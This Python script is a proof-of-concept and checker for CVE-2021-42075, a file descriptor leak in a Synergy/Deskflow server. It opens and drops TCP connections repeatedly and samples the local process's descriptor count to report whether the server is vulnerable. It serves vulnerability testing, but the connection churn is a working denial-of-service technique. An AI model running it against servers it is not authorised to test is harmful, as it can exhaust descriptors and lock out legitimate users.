#!/usr/bin/env python3
"""
CVE-2021-42075 - server leaks file descriptors for established TCP connections.

Before 1.18.0 the server did not close the descriptor for a TCP connection once
it had been established, so every connection an attacker made and dropped cost
the server one descriptor permanently. An unauthenticated remote peer could
repeat that until the process hit its descriptor limit and stopped accepting
anyone, which is the denial of service.

The connection does not have to be authenticated or even complete a TLS
handshake, because the leak is at the socket layer beneath all of that. This
PoC therefore just connects and drops, repeatedly.

A descriptor count is the only reliable signal. A server that has stopped
accepting is a late and destructive symptom, and the absence of it proves
nothing on a host with a generous limit. So when the target is local this
samples /proc/<pid>/fd directly: a patched server stays flat, a leaking one
climbs by roughly one per connection.

Against a remote target there is no count to sample, so the run can only
report whether the server was still answering afterwards, and says so rather
than claiming the fix is present.

Exit codes: 1 VULNERABLE, 0 PASS, 2 inconclusive.
"""

import argparse
import os
import socket
import sys
import time

# Descriptor counts move around a little on their own as the server accepts and
# retires connections, so a handful of extra descriptors is not a leak. A real
# leak grows with the number of connections, not with time.
NOISE_ALLOWANCE = 16
LEAK_FRACTION = 0.25


def find_server_pid():
    found = []
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        try:
            with open(f"/proc/{entry}/comm", encoding="utf-8") as fh:
                if fh.read().strip() in ("deskflow-core", "synergy-core"):
                    found.append(int(entry))
        except OSError:
            continue
    return found


def read_fd_count(pid):
    try:
        return len(os.listdir(f"/proc/{pid}/fd"))
    except OSError:
        return None


def churn(host, port, count, timeout):
    """Connect and drop count times. Returns how many connections were established."""
    established = 0
    for index in range(count):
        try:
            sock = socket.create_connection((host, port), timeout=timeout)
        except OSError:
            continue
        established += 1
        sock.close()
        if index and index % 100 == 0:
            print(f"    {index} connections")
    return established


def server_answering(host, port, timeout):
    try:
        socket.create_connection((host, port), timeout=timeout).close()
        return True
    except OSError:
        return False


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--count", type=int, default=400, help="connections to open and drop")
    ap.add_argument("--timeout", type=float, default=2.0)
    ap.add_argument("--server-pid", type=int, default=None,
                    help="pid of the local server to sample; auto-detected if omitted")
    args = ap.parse_args()

    print("CVE-2021-42075 - file descriptor leak on established connections")
    print(f"target: {args.host}:{args.port}, {args.count} connections\n")

    pid = args.server_pid
    if pid is None:
        found = find_server_pid()
        if len(found) == 1:
            pid = found[0]
        elif len(found) > 1:
            print(f"[warn] several server processes {found}, pass --server-pid to pick one")

    before = read_fd_count(pid) if pid else None
    if before is None:
        print("[*] no local descriptor count available, running blind")
    else:
        print(f"[*] sampling pid {pid}, {before} descriptors open")

    established = churn(args.host, args.port, args.count, args.timeout)
    print(f"[*] established and dropped {established} connections")
    time.sleep(2.0)

    if before is None:
        if server_answering(args.host, args.port, args.timeout):
            print("[ERROR] server still answering, but without a descriptor count this")
            print("        cannot tell a patched server from a leaking one that has")
            print("        not yet hit its limit. re-run against a local server.")
            return 2
        print("[FAIL] server stopped accepting connections - VULNERABLE (CVE-2021-42075)")
        return 1

    after = read_fd_count(pid)
    if after is None:
        print("[ERROR] server process went away during the run")
        return 2

    growth = after - before
    threshold = max(NOISE_ALLOWANCE, int(established * LEAK_FRACTION))
    print(f"[*] descriptors: {before} -> {after} (growth {growth}, threshold {threshold})")

    if growth >= threshold:
        print(f"[FAIL] server retained {growth} descriptors - VULNERABLE (CVE-2021-42075)")
        return 1

    print("[PASS] descriptor count stayed flat, connections are being closed")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
